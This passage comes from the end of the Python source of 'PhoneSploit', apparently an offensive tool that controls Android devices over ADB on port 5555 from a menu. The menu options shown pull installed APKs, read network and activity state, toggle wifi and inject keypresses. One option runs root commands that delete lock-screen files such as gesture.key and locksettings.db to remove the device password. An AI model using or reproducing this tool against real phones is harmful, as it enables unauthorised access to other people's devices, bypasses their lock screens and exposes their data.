                option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

            except KeyboardInterrupt:
                option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '18':
            os.system("adb -s " +device_name+ " shell ip address show wlan0")
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '19':
            print (("     "+connect))
            print (("    [{0}+{1}]Enter a package name. They look like this --> com.snapchat.android").format(Fore.RED, Fore.WHITE))
            package_name = input("    "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" shell pm path "+package_name)
            print (("         "+connect))
            print (("        [{0}+{1}]Enter The path.looks like this /data/app/com.snapchat.android-qWgDcBiCEvANq6op_NPqeA==/base.apk").format(Fore.RED, Fore.WHITE))
            path = input("        "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
            print (("             "+connect))
            print (("            [{0}+{1}]Enter The location to store the apk: [Default: present working directory]")  .format(Fore.RED, Fore.WHITE))
            location =   input("            "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
            os.system("adb -s " +device_name+" pull "+path+" "+location)
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '20':
            os.system("adb -s " +device_name+ " shell dumpsys battery")
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '21':
            os.system("adb -s " +device_name+ " shell netstat")
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '22':
            print (("     "+connect))
            print (("    [{0}+{1}] To turn wifi back on you need the device to be pluged in.").format(Fore.RED, Fore.WHITE))
            print (("     "+connect))
            on_off = input(Fore.WHITE + "    ["+Fore.RED+"+"+Fore.WHITE+"]Would you like the wifi "+Fore.GREEN +"on"+Fore.WHITE +"/"+Fore.RED +"off "+Fore.WHITE)
            if on_off == 'off':
                command = " shell svc wifi disable"
            else:
                command = " shell svc wifi enable"

            os.system("adb -s "+device_name+command)
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '23':
            print ((Fore.WHITE + "    [{0}+{1}]{1}THE DEVICE NEEDS TO BE ROOTED TO CONTINUE TO EXIT USE CTRL +C THIS IS ALSO UNTESTED").format(Fore.RED, Fore.WHITE))
            print (("     "+connect))
            print (Fore.RED + "******************TRYING TO REMOVE PASS******************")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/gesture.key'")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db'")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-wal'")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-shm'")
            print (Fore.RED + "******************TRYING TO REMOVE PASS******************")
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '24':
            print ('''
    0 -->  "KEYCODE_UNKNOWN"
    1 -->  "KEYCODE_MENU"
    2 -->  "KEYCODE_SOFT_RIGHT"
    3 -->  "KEYCODE_HOME"
    4 -->  "KEYCODE_BACK"
    5 -->  "KEYCODE_CALL"
    6 -->  "KEYCODE_ENDCALL"
    7 -->  "KEYCODE_0"
    8 -->  "KEYCODE_1"
    9 -->  "KEYCODE_2"
    10 -->  "KEYCODE_3"
    11 -->  "KEYCODE_4"
    12 -->  "KEYCODE_5"
    13 -->  "KEYCODE_6"
    14 -->  "KEYCODE_7"
    15 -->  "KEYCODE_8"
    16 -->  "KEYCODE_9"
    17 -->  "KEYCODE_STAR"
    18 -->  "KEYCODE_POUND"
    19 -->  "KEYCODE_DPAD_UP"
    20 -->  "KEYCODE_DPAD_DOWN"
    21 -->  "KEYCODE_DPAD_LEFT"
    22 -->  "KEYCODE_DPAD_RIGHT"
    23 -->  "KEYCODE_DPAD_CENTER"
    24 -->  "KEYCODE_VOLUME_UP"
    25 -->  "KEYCODE_VOLUME_DOWN"
    26 -->  "KEYCODE_POWER"
    27 -->  "KEYCODE_CAMERA"
    28 -->  "KEYCODE_CLEAR"
    29 -->  "KEYCODE_A"
    30 -->  "KEYCODE_B"
    31 -->  "KEYCODE_C"
    32 -->  "KEYCODE_D"
    33 -->  "KEYCODE_E"
    34 -->  "KEYCODE_F"
    35 -->  "KEYCODE_G"
    36 -->  "KEYCODE_H"
    37 -->  "KEYCODE_I"
    38 -->  "KEYCODE_J"
    39 -->  "KEYCODE_K"
    40 -->  "KEYCODE_L"
    41 -->  "KEYCODE_M"
    42 -->  "KEYCODE_N"
    43 -->  "KEYCODE_O"
    44 -->  "KEYCODE_P"
    45 -->  "KEYCODE_Q"
    46 -->  "KEYCODE_R"
    47 -->  "KEYCODE_S"
    48 -->  "KEYCODE_T"
    49 -->  "KEYCODE_U"
    50 -->  "KEYCODE_V"
    51 -->  "KEYCODE_W"
    52 -->  "KEYCODE_X"
    53 -->  "KEYCODE_Y"
    54 -->  "KEYCODE_Z"
    55 -->  "KEYCODE_COMMA"
    56 -->  "KEYCODE_PERIOD"
    57 -->  "KEYCODE_ALT_LEFT"
    58 -->  "KEYCODE_ALT_RIGHT"
    59 -->  "KEYCODE_SHIFT_LEFT"
    60 -->  "KEYCODE_SHIFT_RIGHT"
    61 -->  "KEYCODE_TAB"
    62 -->  "KEYCODE_SPACE"
    63 -->  "KEYCODE_SYM"
    64 -->  "KEYCODE_EXPLORER"
    65 -->  "KEYCODE_ENVELOPE"
    66 -->  "KEYCODE_ENTER"
    67 -->  "KEYCODE_DEL"
    68 -->  "KEYCODE_GRAVE"
    69 -->  "KEYCODE_MINUS"
    70 -->  "KEYCODE_EQUALS"
    71 -->  "KEYCODE_LEFT_BRACKET"
    72 -->  "KEYCODE_RIGHT_BRACKET"
    73 -->  "KEYCODE_BACKSLASH"
    74 -->  "KEYCODE_SEMICOLON"
    75 -->  "KEYCODE_APOSTROPHE"
    76 -->  "KEYCODE_SLASH"
    77 -->  "KEYCODE_AT"
    78 -->  "KEYCODE_NUM"
    79 -->  "KEYCODE_HEADSETHOOK"
    80 -->  "KEYCODE_FOCUS"
    81 -->  "KEYCODE_PLUS"
    82 -->  "KEYCODE_MENU"
    83 -->  "KEYCODE_NOTIFICATION"
    84 -->  "KEYCODE_SEARCH"
    85 -->  "TAG_LAST_KEYCODE"
            ''')
            print (("[{0}+{1}]Enter a number.").format(Fore.RED, Fore.WHITE))
            num = input(arrow + "phonesploit"+Fore.RED + "(keycode) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" shell input keyevent "+num)
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '25':
            os.system("adb -s " +device_name+ " dumpsys activity")
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '0':
            global page2
            if page2 is True:
                clear(page_2)
                option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
            else:
                clear(page_1)
                option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == 'p':
            os.system('clear')
            page2 = True
            banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4,logo_design_5,logo_design_6,logo_design_7,logo_design_8])
            print (Fore.RED + banner_title)
            print (page_2)
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == 'b':
            os.system('clear')
            page2 = False
            banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4,logo_design_5,logo_design_6,logo_design_7,logo_design_8])
            print (Fore.RED + banner_title)
            print (page_1)
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '99':
            sys.exit()
            break
        else:
            os.system("error: invalid menu option")
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

#=============================

def clear(page):
    global page2
    os.system('clear')
    banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4,logo_design_5,logo_design_6,logo_design_7,logo_design_8])
    print (Fore.RED + banner_title)    
    print (page)

def cls(page):
    global page2
    os.system('cls')
    banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4,logo_design_5,logo_design_6,logo_design_7])
    print (Fore.RED + banner_title)    
    print (page)

platform = get_platform()

#=============================  
# Run

if platform is 'Windows':
    try:
        init(convert=True)
        os.chdir(CurrentDir+"//adb")
        print (Fore.RED + "Starting  adb server..")
        os.system("adb tcpip 5555")
        t.sleep(4)
        os.system('cls')
        banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4,logo_design_5,logo_design_6,logo_design_7])
        print (Fore.RED + banner_title)  
        print (page_1)
        main()
    except KeyboardInterrupt:
        main()
else:
    try:
        print (Fore.RED + "Starting  adb server..")
        os.system("adb tcpip 5555")
        t.sleep(4)
        os.system('clear')
        banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4,logo_design_5,logo_design_6,logo_design_7,logo_design_8])
        print (Fore.RED + banner_title)
        print (page_1)
        main_linux()
    except KeyboardInterrupt:
        main_linux()